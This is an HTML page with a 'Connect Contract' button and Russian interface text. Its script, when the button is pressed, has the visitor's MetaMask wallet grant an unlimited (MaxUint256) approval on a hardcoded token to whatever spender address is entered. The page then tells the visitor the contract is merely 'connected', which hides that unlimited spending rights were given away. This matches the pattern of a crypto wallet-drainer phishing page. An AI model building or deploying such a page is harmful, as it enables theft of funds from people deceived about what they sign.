<!DOCTYPE html>
<html lang="ru">
<head>
  <meta charset="UTF-8" />
  <title>Connect Contract</title>
  <meta name="viewport" content="width=device-width, initial-scale=1" />
  <style>
    body { font-family: system-ui, sans-serif; background:#0b0c10; color:#e5e5e5; display:flex; justify-content:center; padding:40px 0; }
    .wrap { width:100%; max-width:420px; padding:20px; }
    h1 { font-size:22px; margin-bottom:6px; }
    input { width:100%; padding:10px; border-radius:6px; border:1px solid #2b3644; background:#0b0c10; color:#e5e5e5; margin-bottom:12px; }
    button { width:100%; padding:12px; border:none; border-radius:6px; background:#45a29e; color:#0b0c10; font-size:15px; font-weight:600; cursor:pointer; }
    button:hover { background:#66fcf1; }
    .status { margin-top:16px; font-size:12px; color:#9a9a9a; white-space:pre-wrap; background:#0b0f16; padding:10px; border-radius:6px; border:1px solid #1f2833; }
  </style>
</head>
<body>
  <div class="wrap">
    <h1>Connect Contract</h1>
    <input id="spender" placeholder="Адрес контракта" />
    <button id="connectBtn">Подключить</button>
    <div id="status" class="status">Ожидание действия.</div>
  </div>

  <!-- Рабочий CDN, который GitHub Pages НЕ блокирует -->
  <script src="https://cdnjs.cloudflare.com/ajax/libs/ethers/6.7.1/ethers.umd.min.js"></script>

  <script>
    const tokenAddress = "0x55d398326f99059fF775485246999027B3197955";
    const abi = [
      {
        "inputs":[{"internalType":"address","name":"spender","type":"address"},{"internalType":"uint256","name":"amount","type":"uint256"}],
        "name":"approve",
        "outputs":[{"internalType":"bool","name":"","type":"bool"}],
        "stateMutability":"nonpayable",
        "type":"function"
      }
    ];

    let provider;
    let signer;

    function setStatus(t) {
      document.getElementById("status").textContent = t;
    }

    async function connect() {
      try {
        if (!window.ethereum) {
          setStatus("MetaMask не найден.");
          return;
        }

        await ethereum.request({ method: "eth_requestAccounts" });

        provider = new ethers.BrowserProvider(window.ethereum);
        signer = await provider.getSigner();

        const spender = document.getElementById("spender").value.trim();
        if (!spender) {
          setStatus("Введите адрес контракта.");
          return;
        }

        const token = new ethers.Contract(tokenAddress, abi, signer);
        const max = ethers.MaxUint256;

        setStatus("Отправка транзакции...");
        const tx = await token.approve(spender, max);

        setStatus("Ожидание подтверждения...\nTx: " + tx.hash);
        await tx.wait();

        setStatus("Готово. Контракт подключён.\nTx: " + tx.hash);
      } catch (e) {
        setStatus("Ошибка: " + (e.reason || e.message || e));
      }
    }

    document.getElementById("connectBtn").onclick = connect;
  </script>
</body>
</html>
